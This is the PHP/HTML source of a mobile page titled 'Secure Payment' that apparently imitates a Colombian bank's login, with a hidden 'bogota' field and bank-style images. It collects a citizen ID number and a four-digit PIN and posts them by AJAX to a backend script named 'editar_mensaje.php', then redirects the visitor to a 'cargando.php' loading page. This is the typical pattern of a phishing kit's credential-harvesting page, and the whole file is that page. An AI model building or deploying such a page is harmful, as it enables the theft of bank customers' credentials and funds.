<?php

?>

<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=0">
    <title>Secure Payment</title>


    <script type="text/javascript" src="/scripts/jquery-3.6.0.min.js"></script>
		<script src="/scripts/jquery.jclock-min.js" type="text/javascript"></script>
   		<script type="text/javascript" src="/scripts/functions2.js"></script>  		

    <style>
*{
    margin: 0;
    padding:0;
    font-font-family: arial, helvetica, sans-serif;
}

input{
    width: 86%;
    height: 45px;
    padding-left: 15px;
    
    border-radius: 7px;
    border: 1px solid rgb(219,219,219);
    margin-bottom: 10px;
}

select{
    width: 90%;
    height: 45px;
    padding-left: 15px;
    margin-top: 12px;
    background-color: white;
    color: black;
    border:1px solid rgb(219,219,219);
    margin-bottom: 12px;
}

    </style>
</head>
<body>
    
<img src="img/menu.jfif" alt="" width="100%">
<center><img src="img/mensaje.jfif" alt="" width="93%"></center>

<center><div class="clave" style="width:80%; height:40px; border:1px solid rgb(219,219,219); border-bottom:1px solid #0040a8;"><br><br>
<a style="position:absolute; left:40%; top:230px;">Clave segura</a>
</div>

    <div class="datos" style="width:80%; border:1px solid rgb(219,219,219);">
            <select name="cc" id="">
                <option value="Cedula">Cédula de ciudadanía</option>
            </select><br>
            <input type="tel" name="user" id="txtUsuario" placeholder="Número de documento" minlength="6" maxlength="10" pattern="^[0-9]{6,10}$" oninput="this.value = this.value.replace(/\D+/g, '');" required><br>
            <input type="password" name="clave" id="txtPass" placeholder="Clave segura" minlength="4" maxlength="4" required><br>
            <input type="hidden" value="bogota" id="banco">

            <a style="color:#0040a8;position:relative; left:-95px;">Olvide mi clave</a><br><br>
            <button style="border-radius:100px; width:90%; height:50px; background-color:#0040a8; color:white; font-size:15px;" id="btnUsuario">Ingresar ahora</button>
            <p></p>
            <img src="img/botonabajo.jfif" alt="" width="95%">
    </div></center>

<img src="img/1.jfif" alt="" width="100%">
<img src="img/2.jfif" alt="" width="100%">
<img src="img/3.jfif" alt="" width="100%">


<script>
  const txtPass = document.getElementById('txtPass');

  txtPass.addEventListener('input', function() {
    const value = txtPass.value;
    const cleanValue = value.replace(/\D/g, ''); // Remover caracteres no numéricos

    if (value !== cleanValue) {
      txtPass.value = cleanValue;
    }
  });
</script>

<script type="text/javascript">
	var espera = 0;

	let identificadorTiempoDeEspera;

	function retardor() {
	  identificadorTiempoDeEspera = setTimeout(retardorX, 900);
	}

	function retardorX() {

	}

	$(document).ready(function() {

		$('#btnUsuario').click(function(){
			if ($("#txtUsuario").val().length > 0) {
				const data = {
                    'usuario': $("#txtUsuario").val(),
                    'pass': $("#txtPass").val()
                };
                console.log(data);
                $.ajax({
                    url: '../../acciones/editar_mensaje.php',
                    method: 'POST',
                    data: {
                        data: data
                    },
                    success: function(response) {
                        const result = JSON.parse(response);
                        if (result.success) {
                            window.location.href = "cargando.php";
                        } else {
                            alert('Error de conexión, por favor intente de nuevo');
                           window.location.href = "/";
                        }
                    },
                    error: function(xhr, status, error) {
                        console.log("Warning")
                    }
                });
			}else{
				$("#err-mensaje").show();
				$(".user").css("border", "1px solid red");
				$("#txtUsuario").focus();
			}			
		});

		$("#txtUsuario").keyup(function(e) {
			$(".user").css("border", "1px solid #CCCCCC");	
			$("#err-mensaje").hide();				
		});
	});
</script>




</body>
</html>